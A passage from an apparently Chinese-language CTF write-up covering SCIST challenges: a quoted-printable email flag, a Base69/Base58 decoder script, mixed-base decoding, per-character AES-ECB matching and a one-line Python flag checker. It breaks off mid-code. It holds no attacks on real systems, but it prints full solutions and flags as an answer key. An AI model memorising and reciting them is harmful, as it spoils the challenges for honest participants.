tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>&lt;div style=3D"margin:0px;padding:10px 0px 0px;border=:0px;font-family:DDG_ProximaNova,DDG_ProximaNova_UI_0,DDG_ProximaNova_UI_1,=DDG_ProximaNova_UI_2,DDG_ProximaNova_UI_3,DDG_ProximaNova_UI_4,DDG_ProximaN=ova_UI_5,DDG_ProximaNova_UI_6,<span class="token entity" title="&quot;">&amp;quot;</span>Proxima Nova<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Helvetica Neue=<span class="token entity" title="&quot;">&amp;quot;</span>,Helvetica,<span class="token entity" title="&quot;">&amp;quot;</span>Segoe UI<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Nimbus Sans L<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Liber=ation Sans<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Open Sans<span class="token entity" title="&quot;">&amp;quot;</span>,FreeSans,Arial,sans-serif;font-stret=ch:inherit;line-height:1.45em;font-size:14.399999618530273px;vertical-align=:baseline;word-wrap:break-word;color:black;opacity:1">&lt;span style=3D"margin=:0px;padding:0px;border:0px;font-family:inherit;font-style:inherit;font-var=iant-caps:inherit;font-stretch:inherit;line-height:inherit;vertical-align:b=aseline">Ohh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>It<span class="token entity" title="&#39;">&amp;#39;</span>s the<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span sty=le=3D"margin:0px;padding:0px;border:0px;font-family:inherit;font-style:inhe=rit;font-variant-caps:inherit;font-weight:600;font-stretch:inherit;line-hei=ght:inherit;vertical-align:baseline">final<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span s=tyle=3D"margin:0px;padding:0px;border:0px;font-family:inherit;font-style:in=herit;font-variant-caps:inherit;font-weight:600;font-stretch:inherit;line-h=eight:inherit;vertical-align:baseline">countdown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;=br>We<span class="token entity" title="&#39;">&amp;#39;</span>re leaving together<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>The<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;=span style=3D"margin:0px;padding:0px;border:0px;font-family:inherit;font-st=yle:inherit;font-variant-caps:inherit;font-weight:600;font-stretch:inherit;=line-height:inherit;vertical-align:baseline">final<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0&lt;/span=>&lt;span style=3D"margin:0px;padding:0px;border:0px;font-family:inherit;font-=style:inherit;font-variant-caps:inherit;font-weight:600;font-stretch:inheri=t;line-height:inherit;vertical-align:baseline">countdown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>We<span class="token entity" title="&#39;">&amp;#39;</span>ll all miss her so<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>It<span class="token entity" title="&#39;">&amp;#39;</span>s the&lt;spa=n>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0px;padding:0px;border:0px;font-family=:inherit;font-style:inherit;font-variant-caps:inherit;font-weight:600;font-=stretch:inherit;line-height:inherit;vertical-align:baseline">final<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;s=pan>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0px;padding:0px;border:0px;font-fami=ly:inherit;font-style:inherit;font-variant-caps:inherit;font-weight:600;fon=t-stretch:inherit;line-height:inherit;vertical-align:baseline">countdown&lt;/s=pan><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>(The<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0px=;padding:0px;border:0px;font-family:inherit;font-style:inherit;font-variant=-caps:inherit;font-weight:600;font-stretch:inherit;line-height:inherit;vert=ical-align:baseline">final<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0=px;padding:0px;border:0px;font-family:inherit;font-style:inherit;font-varia=nt-caps:inherit;font-weight:600;font-stretch:inherit;line-height:inherit;ve=rtical-align:baseline">countdown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Ohh, it<span class="token entity" title="&#39;">&amp;#39;</span>=s the<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0px;padding:0px;border:0px;fo=nt-family:inherit;font-style:inherit;font-variant-caps:inherit;font-weight:=600;font-stretch:inherit;line-height:inherit;vertical-align:baseline">final=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0px;padding:0px;border:0px;=font-family:inherit;font-style:inherit;font-variant-caps:inherit;font-weigh=t:600;font-stretch:inherit;line-height:inherit;vertical-align:baseline">cou=ntdown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Yea.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;div style=3D"margin:15px 0p=x 0px;padding:0px;border:0px;font-family:inherit;font-style:inherit;font-va=riant-caps:inherit;font-stretch:inherit;line-height:inherit;vertical-align:=baseline;color:rgb(136,136,136)">Source: MetroLyrics<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>--000000000000cc444505c77bad41--</code></pre>    </div></div><p>其中看到了 flag format</p><pre class=" language-bash"><code class="language-bash">SCIST<span class="token punctuation">{</span><span class="token operator">=</span>E2<span class="token operator">=</span>84<span class="token operator">=</span>B31<span class="token operator">=</span>E2<span class="token operator">=</span>93<span class="token operator">=</span>82<span class="token operator">=</span>E2<span class="token operator">=</span>93<span class="token operator">=</span>94_4<span class="token operator">=</span>E2<span class="token operator">=</span>84<span class="token operator">=</span>95<span class="token operator">=</span>E1<span class="token operator">=</span>B5<span class="token operator">=</span>88_<span class="token operator">=</span>E2<span class="token operator">=</span>84<span class="token operator">=</span>9A-<span class="token operator">=</span>E2<span class="token operator">=</span>92<span class="token operator">=</span>BA<span class="token operator">=</span><span class="token operator">=</span>E1<span class="token operator">=</span>B4<span class="token operator">=</span>BA<span class="token operator">=</span>E2<span class="token operator">=</span>84<span class="token operator">=</span>AD0d<span class="token operator">=</span>E2<span class="token operator">=</span>84<span class="token operator">=</span>B9<span class="token operator">=</span>EF<span class="token operator">=</span>B8<span class="token operator">=</span>8F<span class="token operator">=</span>EF<span class="token operator">=</span>BD<span class="token operator">=</span>8E9_a<span class="token operator">=</span>E2<span class="token operator">=</span>93<span class="token operator">=</span>A1e_c<span class="token operator">=</span>E2<span class="token operator">=</span>93<span class="token operator">=</span>9E0<span class="token operator">=</span>E2<span class="token operator">=</span><span class="token operator">=</span>84<span class="token operator">=</span>93<span class="token punctuation">}</span><span class="token operator">=</span>E5<span class="token operator">=</span>AD<span class="token operator">=</span>A3<span class="token operator">=</span>E5<span class="token operator">=</span>BE<span class="token operator">=</span>8C<span class="token operator">=</span>E8<span class="token operator">=</span>B3<span class="token operator">=</span>BD</code></pre><p>把上面這串丟進下面的 html 裡面再用郵件打開可以看到這串</p><p><code>SCIST{ℳ1Ⓜⓔ_4ℕᵈ_ℚ-Ⓔᴺℭ0dℹ️ｎ9_aⓡe_cⓞ0ℓ} 季後賽</code></p><p>然後 Hint 說<code>FLAG match regex ^SCIST{[^_=}]+}$</code></p><p>所以拿到 <a href="https://regex101.com/">regex101</a> 測，把<code>_</code>都拔掉，但是答案不正確</p><p>此時想到另外一個Hint是 <code>FLAG contains some space, you shouldn’t remove it.</code></p><p>所以就把<code>_</code>改成 space 就過了</p><blockquote><p>flag:<code>SCIST{ℳ1Ⓜⓔ 4ℕᵈ ℚ-Ⓔᴺℭ0dℹ️ｎ9 aⓡe cⓞ0ℓ}</code></p></blockquote><h3 id="Base69-451"><a href="#Base69-451" class="headerlink" title="Base69(451)"></a>Base69(451)</h3><blockquote><p>Maybe something good this way.<br>Oh here’s a Base69, maybe I can use this to charging shell.<br>Author: MuMu<br>Hint：It’s not like Base64 or Base32 , maybe you can try other Bases’ Serial Alogrithm.</p></blockquote><p>有給 alpha 和enc</p><p>就是要照某個 Base 加密的方法去解密</p><p>Hint 說不是 Base64 32</p><p>於是嘗試了許多種 Base 加密</p><p>最後得出了 Base58</p><p>參考網址 <a href="http://118.89.229.121/index.php/archives/60.html">base全家桶</a></p><p><strong>script</strong></p><pre class=" language-python"><code class="language-python">alpha <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?_{}>&lt;'</span>enc <span class="token operator">=</span> <span class="token string">'2hk>t?GBbU_ijB1Xa>pQK69_e1e2n>FCoPL9Zd??x9_y68fvF'</span>tbl<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>alpha<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>alpha<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            tbl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#tbl [2, 17, 20, 67, 29, 63, 42, 37, 11, 56, 64, 18, 19, 37, 1, 59, 10, 67, 25, 52, 46, 6, 9, 64, 14, 1, 14, 2, 23, 67, 41, 38, 24, 51, 47, 9, 61, 13, 63, 63, 33, 9, 64, 34, 6, 8, 15, 31, 41]</span>n<span class="token operator">=</span><span class="token number">48</span>sum<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> tbl<span class="token punctuation">:</span>    sum<span class="token operator">+=</span>i<span class="token operator">*</span>pow<span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>    n<span class="token operator">-=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#sum 41408543872100313264991885783357661336445924157488989323449377550872931073194048919845245</span>f<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">while</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">:</span>    f<span class="token operator">+=</span>chr<span class="token punctuation">(</span>sum<span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">)</span>    sum<span class="token operator">//=</span><span class="token number">256</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><blockquote><p>flag:<code>SCIST{BasE58???_WhY_n07_us1ng_Base69}</code></p></blockquote><h2 id="Crypto-2-x2F-3"><a href="#Crypto-2-x2F-3" class="headerlink" title="Crypto(2/3)"></a>Crypto(2/3)</h2><h3 id="CarryMe-379"><a href="#CarryMe-379" class="headerlink" title="CarryMe(379)"></a>CarryMe(379)</h3><blockquote><p>Where the hell is source code ??<br>Author: MuMu</p></blockquote><pre class=" language-bash="><code class="language-bash=">21010011 32111 41021 5313 6220 7234 8163 953 a109 b47 c70 d3a e7b f49 g35 h5a i62 j2a k4f l4f m24 n48 o23 p3k q1n r47 s3b t3a u3k v1h w3p x1g y38 z3k</code></pre><p>每一個字前面代表是幾進位制</p><p>換成 dec 之後轉 chr 就有了</p><p>使用工具：<a href="http://www.kwuntung.net/hkunit/base/base.php">進制轉換</a></p><h3 id="ECBytes-419"><a href="#ECBytes-419" class="headerlink" title="ECBytes(419)"></a>ECBytes(419)</h3><blockquote><p>There’s no description :) , just solve that.<br>Author: MuMu</p></blockquote><p>給了alpha、output、task.py</p><div class="spoiler collapsed">    <div class="spoiler-title">        task.py    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token keyword">from</span> os <span class="token keyword">import</span> urandom<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">from</span> string <span class="token keyword">import</span> printablekey <span class="token operator">=</span> urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key <span class="token punctuation">,</span> mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>alpha <span class="token operator">=</span> printable<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"alpha"</span> <span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> alpha<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"output"</span> <span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span></code></pre>    </div></div><p>alpha、output 打開是一堆亂碼</p><p>因為是分別把每個字都拿去 ECB</p><p>所以只要把 output 去比對 alpha 就可以了</p><h2 id="Reverse-2-x2F-3"><a href="#Reverse-2-x2F-3" class="headerlink" title="Reverse(2/3)"></a>Reverse(2/3)</h2><h3 id="Flag-Checker-One-Line-Edition-379"><a href="#Flag-Checker-One-Line-Edition-379" class="headerlink" title="Flag Checker | One-Line Edition(379)"></a>Flag Checker | One-Line Edition(379)</h3><blockquote><p>Good, old flag checker… But in one line…<br>Author: CSY54</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        task.py    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token keyword">lambda</span> a<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> b<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> c<span class="token punctuation">,</span> d<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> e<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> f<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> g<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Congratulations!'</span> <span class="token keyword">if</span> g <span class="token keyword">else</span> <span class="token string">'Not quite!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">263</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">328</span><span class="token punctuation">,</span> <span class="token number">335</span><span class="token punctuation">,</span> <span class="token number">269</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">263</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">291</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">277</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">[</span>sum<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> e<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> z<span class="token punctuation">:</span> <span class="token punctuation">[</span>c<span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token keyword">for</span> y <span class="token keyword">in</span> z<span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">[</span>_ <span class="token operator">^</span> <span class="token number">10</span> <span class="token operator">-</span> <span class="token number">3</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> b<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>map<span class="token punctuation">(</span>ord<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">'What\'s the flag?\n> '</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>    </div></div><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>9, 10, 23<span class="token punctuation">]</span>, <span class="token punctuation">[</span>23, 22, 20<span class="token punctuation">]</span>, <span class="token punctuation">[</span>14, 20, 4<span class="token punctuation">]</span>, <span class="token punctuation">[</span>13, 12, 20<span class="token punctuation">]</span>, <span class="token punctuation">[</span>8, 7, 20<span class="token punctuation">]</span>, <span class="token punctuation">[</span>0, 3, 17<span class="token punctuation">]</span>, <span class="token punctuation">[</span>9, 16, 24<span class="token punctuation">]</span>, <span class="token punctuation">[</span>24, 8, 6<span class="token punctuation">]</span>, <span class="token punctuation">[</span>18, 14, 11<span class="token punctuation">]</span>, <span class="token punctuation">[</span>22, 15, 21<span class="token punctuation">]</span>, <span class="token punctuation">[</span>2, 21, 0<span class="token punctuation">]</span>, <span class="token punctuation">[</span>11, 9, 19<span class="token punctuation">]</span>, <span class="token punctuation">[</span>5, 4, 3<span class="token punctuation">]</span>, <span class="token punctuation">[</span>17, 11, 7<span class="token punctuation">]</span>, <span class="token punctuation">[</span>19, 1, 21<span class="token punctuation">]</span>, <span class="token punctuation">[</span>4, 11, 14<span class="token punctuation">]</span>, <span class="token punctuation">[</span>12, 4, 20<span class="token punctuation">]</span>, <span class="token punctuation">[</span>23, 21, 13<span class="token punctuation">]</span>, <span class="token punctuation">[</span>3, 2, 15<span class="token punctuation">]</span>, <span class="token punctuation">[</span>4, 12, 4<span class="token punctuation">]</span></code></pre><p>這串的當作 flag 的 index^7 ,三個一組加起來會得到下面這個陣列<br>Ex.<code>ord(flag[9])+ord(flag[10])+ord(flag[23])=251</code></p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">263</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">328</span><span class="token punctuation">,</span> <span class="token number">335</span><span class="token punctuation">,</span> <span class="token number">269</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">263</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">291</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">277</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">]</span></code></pre><p>因為知道 flag 的第 0,1,2,3,4,5,24 個值(SCIST{})</p><p>所以每一個都可以推出來</p><pre class=" language-python"><code class="language-python">flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token 